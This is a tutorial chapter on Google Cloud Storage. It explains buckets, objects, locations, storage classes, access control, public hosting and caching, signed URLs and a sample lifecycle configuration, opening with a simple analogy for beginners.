text:
Explain it like I’m ten






Tip



A bucket is a big labelled box in Google’s warehouse. Every box in the whole world must have a different label, like a house address.
An object is one item in the box: a photo, a web page, a report. Its name can contain slashes (photos/pink.jpg), so it looks like folders, but the box is really one flat list of names.
Storage classes are shelves. The front shelf (Standard) costs more each month, but you can grab things any time for free. The back shelves (Nearline, Coldline, Archive) are cheaper each month, but you pay a small fee each time you fetch something, and you promise to leave things there for a minimum time.
A signed URL is a ticket that expires: anyone holding it can pick up one item until the time on the ticket runs out.

title: 5. Cloud Storage
text:
The idea, precisely

Buckets and objects

A bucket name is globally unique: 3 to 63 characters, lowercase letters, digits, -, _ and ., starting and ending with a letter or digit. Names must not start with goog or contain google. A good habit: start with your project ID, as in lemonade-stand-dev-menu.
An object is addressed as gs://BUCKET/NAME, for example gs://lemonade-stand-dev-menu/index.html.
Objects are immutable: “changing” a file uploads a new version that replaces the old one.



Locations








Location type
Example
Use




Region
europe-west2
data near your customers and your Cloud Run service; cheapest


Dual-region
a pair of regions, such as eur4
survives a regional outage


Multi-region
EU, US, ASIA
content read from many places



The location is fixed when the bucket is created.


Storage classes



Class
Minimum storage duration
Retrieval fee
Good for




STANDARD
none
none
the menu, anything read often


NEARLINE
30 days
yes
photos read about once a month


COLDLINE
90 days
yes
quarterly reports


ARCHIVE
365 days
yes
records kept for the tax office



Every class has the same design target of eleven nines (99.999999999%) annual durability. The classes differ in price and access pattern, not in safety.


Access control

Uniform bucket-level access (recommended) means only IAM decides access, for the whole bucket. The older per-object ACLs are switched off.
Public access prevention blocks allUsers and allAuthenticatedUsers grants. It is a safety catch: turn it off only on buckets meant to be public.
To make the menu public, grant roles/storage.objectViewer to allUsers on that bucket only.



Static hosting and caching
A public object is reachable at https://storage.googleapis.com/BUCKET/OBJECT. The --web-main-page-suffix setting (serve index.html for /) applies when you put a custom domain or a load balancer in front.
Public objects without a Cache-Control header get public, max-age=3600 by default. Browsers and Google’s network may then serve an old menu for up to an hour after you upload a new one. Set a shorter Cache-Control on files that change.


Signed URLs
A signed URL grants time-limited access to one private object, with no Google account needed. V4 signed URLs last at most 7 days. When gcloud storage sign-url signs through a service account you impersonate (no key file), gcloud caps the duration at 12 hours.


Lifecycle rules
A lifecycle configuration lets Cloud Storage act on objects by itself, for example “after 30 days, move to Nearline; after 365 days, delete”. Our file is examples/lifecycle.json:
{
  "lifecycle": {
    "rule": [
      { "action": { "type": "SetStorageClass", "storageClass": "NEARLINE" }, "condition": { "age": 30 } },
      { "action": { "type": "Delete" }, "condition": { "age": 365 } }
    ]
  }
}
age counts days since the object was created. Lifecycle actions run in the background and can take up to a day to apply.
